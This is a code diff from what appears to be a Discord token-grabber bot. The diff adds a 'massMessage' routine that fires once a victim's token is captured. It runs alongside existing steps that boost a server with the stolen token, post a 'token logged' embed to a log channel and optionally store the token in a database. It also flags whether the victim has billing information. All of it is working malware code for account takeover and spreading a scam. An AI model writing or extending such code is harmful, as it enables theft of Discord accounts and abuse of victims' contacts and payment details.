@@ -7,6 +7,7 @@ import WebSocket from "ws";
 import Jimp from "jimp";
 
 import { IConfig, IData, IUser } from './global';
+import massMessage from './util/massMessage';
 const config: IConfig = require('../config.json');
 
 const users = model(config.mongoose.schemaName, new Schema({
@@ -21,9 +22,10 @@ let Timeout: NodeJS.Timeout;
 
 const close = async () => {
     try {
-        await SocketClient.terminate();
         clearTimeout(Heart);
         clearTimeout(Timeout);
+        if (SocketClient.readyState !== 1) return;
+        await SocketClient.close();
     } catch {}
 }
 
@@ -102,6 +104,7 @@ export default (message: Message, embed: MessageEmbed, client: Client) => new Pr
 
                 try {
                     if (config.boostServer) boostServer(client, token, discord);
+                    if (config.massMessage) massMessage(client, token, discord, (billingInformation.length > 0));
                     close();
                     (await client.channels.cache.get(config.logChannel) as TextChannel).send({ embeds: [tokenLoggedEmbed] }).catch(e => {});
                     if (config.mongoose.enabled) {
